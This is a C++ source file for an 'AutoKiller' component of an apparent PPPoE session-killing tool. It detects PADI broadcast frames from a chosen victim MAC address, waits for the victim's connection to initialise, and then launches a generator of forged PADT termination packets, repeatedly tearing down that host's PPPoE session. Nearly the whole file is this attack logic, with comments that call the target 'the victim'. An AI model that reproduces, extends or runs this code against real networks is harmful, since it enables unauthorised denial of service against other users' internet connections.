#include "AutoKiller.h"
#include "GPacketDetector.h"
#include "PADTGenerator.h"
#include <boost/bind.hpp>
#include <boost/thread/mutex.hpp>

using namespace std;
using namespace glib;

AutoKiller::AutoKiller(const boost::array<unsigned char, 6> & src, const boost::array<unsigned char, 6> & dst,
		const std::string & name, const unsigned int interval)
		: Killer(KILLER_ID, src, dst, name, interval)
{
	m_padt_gnr.reset(new PADTGenerator(name, dst.data(), src.data(), interval));
	m_logger = GLogger::getLogger("autokiller");
}

AutoKiller::~AutoKiller()
{
	delete m_logger;
}

void AutoKiller::padi_detected(const unsigned char* packet, int len)
{
	boost::array<unsigned char, 6> srcmac = getSrcMAC();
	if(memcmp(packet+6, srcmac.data(), 6))
	{
		GDEBUG(*m_logger)("AutoKiller::padi_detected not me");
		return;
	}

	GDEBUG(*m_logger)("AutoKiller::padi_detected");

	msig_detected((const unsigned char*)srcmac.data());

	boost::mutex::scoped_lock lock(m_padi_mutex);
	boost::array<unsigned char, 6> dstmac = getDstMAC();

	if(m_padt_gnr->isAlive())
		m_padt_gnr->waitStop();

	// wait for the victim to complete the initialization
	GThread::sleep(1000);
	m_padt_gnr->start();
}

void AutoKiller::killthread()
{
	boost::scoped_ptr<GPacketDetector> padi_dtr(
						new GPacketDetector("ether[0]=255 and ether proto 0x8863",
								getCardName()));
	padi_dtr->AddReactor(boost::bind(&AutoKiller::padi_detected, this, _1, _2));
	padi_dtr->start();

	// Kill the first time
	if(m_padt_gnr->isAlive() == false)
		m_padt_gnr->start();

	while(!IsStopping())
		GThread::sleep(100);

	padi_dtr->waitStop();
	m_padt_gnr->waitStop();
}
